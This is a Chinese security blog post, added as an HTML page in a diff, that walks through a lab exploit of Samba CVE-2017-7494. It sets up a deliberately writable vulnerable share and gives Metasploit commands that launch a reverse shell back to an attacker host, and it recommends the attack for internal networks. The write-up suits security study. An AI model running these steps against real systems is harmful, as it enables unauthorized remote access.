@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Samba RCE 利用小记 [ CVE-2017-7494 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Samba RCE 利用小记 [ CVE-2017-7494 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/04/25/samba-rce/">
+                Samba RCE 利用小记 [ CVE-2017-7494 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/CVE/">CVE</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 Samba 远程执行快速利用小结 CVE-2017-7494,至于samba是什么,我就不科普了[说白点儿就是个win和linux机器共享文件的服务,企业里面已经用到烂的东西],直接看过程吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">漏洞影响Samba <span class="number">3.5</span>.<span class="number">0</span> 之后到<span class="number">4.6</span>.<span class="number">4</span>/<span class="number">4.5</span>.<span class="number">10</span>/<span class="number">4.4</span>.<span class="number">14</span>中间的所有版本</div></pre></td></tr></table></figure></p>
+<p>0x02 关于漏洞的简要描述,说的通俗一点就是’允许samba用户上传自己的类库到可读写的samba目录中’所导致的远程执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/www.samba.org/samba</span><span class="regexp">/security/</span>CVE-<span class="number">2017</span>-<span class="number">7494</span>.html</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x03 在演示漏洞利用之前,我们需要先快速配置下samba环境[这里以centos 6.8 x64上的编译安装为例,至于为什么要编译,只因踏了太多的坑]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">首先,准备好共享目录:</div><div class="line"><span class="comment"># mkdir /opt/opendir</span></div><div class="line"><span class="comment"># cd /opt/opendir</span></div><div class="line"><span class="comment"># mkdir demodir&#123;1..12&#125;</span></div><div class="line"><span class="comment"># touch file&#123;1..12&#125;</span></div><div class="line"><span class="comment"># echo "hello samba" &gt;&gt; file1</span></div><div class="line"><span class="comment"># chmod -R 777 /opt/opendir/  权限务必管够,因为要往这里面读写</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">下载编译安装samba <span class="number">4.5</span>.<span class="number">9</span>:</div><div class="line"><span class="comment"># cd</span></div><div class="line"><span class="comment"># mount /dev/cdrom  /mnt/cdrom/</span></div><div class="line"><span class="comment"># yum -y install gcc perl python-devel gnutls-devel libacl-devel openldap-devel 安装一些依赖</span></div><div class="line"><span class="comment"># wget https://download.samba.org/pub/samba/stable/samba-4.5.9.tar.gz --no-check-certificat</span></div><div class="line"><span class="comment"># tar -zxf samba-4.5.9.tar.gz</span></div><div class="line"><span class="comment"># cd samba-4.5.9</span></div><div class="line"><span class="comment"># ./configure --prefix=/opt/samba/	这里直接让它安装到samba目录下就好了,检测的项可能有些多,耐心等一会</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># make		编译链接的过程可能会稍微长点儿,耐心点儿哈</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># make install</span></div><div class="line"><span class="comment"># echo $?	如果编译过程中没什么错误,就可以接着往下走了</span></div><div class="line"><span class="comment"># ls -l /opt/samba/</span></div></pre></td></tr></table></figure>
+<p><img src="/img/samba install.png" alt="&#39;&#39;"><br></p>
+<p>0x04 编辑samba的主配置文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cp examples/smb.conf.default /opt/samba/etc/smb.conf</span></div><div class="line"><span class="comment"># vi /opt/samba/etc/smb.conf</span></div></pre></td></tr></table></figure></p>
+<p>0x05 添加共享目录<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[global] <span class="comment"># 全局配置</span></div><div class="line">	workgroup  	=  MYGROUP</div><div class="line">	server string  	=  Samba Server</div><div class="line">	log file  	=  <span class="regexp">/opt/samba</span><span class="regexp">/var/log</span>.%m</div><div class="line">	max log size 	=  <span class="number">50</span> 单位kb</div><div class="line">	security  	=  user  务必把这句加上,设置安全等级用的,必须用户登录</div></pre></td></tr></table></figure></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[opendir] #共享目录配置</div><div class="line">	comment 	= CVE-2017-7494</div><div class="line">	browseable  	= yes	对该共享目录可读</div><div class="line">	writable    	= yes		对该共享目录可写</div><div class="line">	path 		= /opt/opendir/</div><div class="line">	# guest ok  	= yes  	是否允许匿名登录,可加可不加,只要保证共享目录能读写就好了,因为要往里写so</div></pre></td></tr></table></figure>
+<p><img src="/img/samba dir.png" alt="&#39;&#39;"><br></p>
+<p>0x06 创建samba用户<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># useradd smber</span></div><div class="line"><span class="comment"># cd /opt/samba/bin/</span></div><div class="line"><span class="comment"># ./smbpasswd -a smber 添加samba用户</span></div><div class="line"><span class="comment"># cd /opt/samba/sbin/ &amp;&amp; ./nmbd &amp;&amp; ./smbd</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/add smb user.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">smbd：为clinet提高资源访问	 tcp  <span class="number">139</span>  <span class="number">445</span></div><div class="line">nmbd：提供netbios主机名解析  	upd  <span class="number">137</span>  <span class="number">138</span></div></pre></td></tr></table></figure>
+<p><img src="/img/start samba services.png" alt="&#39;&#39;"><br></p>
+<p>0x07 准别好msf的exp[当然,有py版的,msf会更方便点]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb</span></div></pre></td></tr></table></figure></p>
+<p>0x08 把它丢到samba的漏洞利用模块目录下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mv is_known_pipename.rb /usr/share/metasploit-framework/modules/exploits/linux/samba/</span></div></pre></td></tr></table></figure></p>
+<p>0x09 开始利用过程:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfconsole</span></div><div class="line">msf &gt; use exploit/linux/samba/is_known_pipename</div><div class="line">msf exploit(is_known_pipename) &gt; set rhost <span class="number">192.168</span>.<span class="number">3.15</span></div><div class="line">msf exploit(is_known_pipename) &gt; set smb_share_base /opt/opendir</div><div class="line">msf exploit(is_known_pipename) &gt; set target <span class="number">0</span></div><div class="line">msf exploit(is_known_pipename) &gt; set payload linux/x64/shell_reverse_tcp</div><div class="line">msf exploit(is_known_pipename) &gt; set lhost <span class="number">192.168</span>.<span class="number">3.9</span></div><div class="line">msf exploit(is_known_pipename) &gt; set lport <span class="number">443</span></div><div class="line">msf exploit(is_known_pipename) &gt; set smbuser smber</div><div class="line">msf exploit(is_known_pipename) &gt; set smbpass admin</div><div class="line">msf exploit(is_known_pipename) &gt; exploit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/samba shell reverse.png" alt="&#39;&#39;"><br><img src="/img/samba login smber.png" alt="&#39;&#39;"><br><img src="/img/succedd.png" alt="&#39;&#39;"><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;中间的坑就不想说了,本来几分钟就可以重现的东西,浪费了一个多小时,唉,都是泪,总之,对于内网的linux机器还是非常值得尝试的,前提是开了此服务并且已经事先拿到了一个可以登录的samba账户密码[匿名非常少,几乎没有],而且版本号务必要对的上才行,说白点,如果直接是yum或者apt安装的,更新非常容易……你懂的,如果是编译安装的可能还更新的稍微慢一点<br><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/exp/">#exp</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
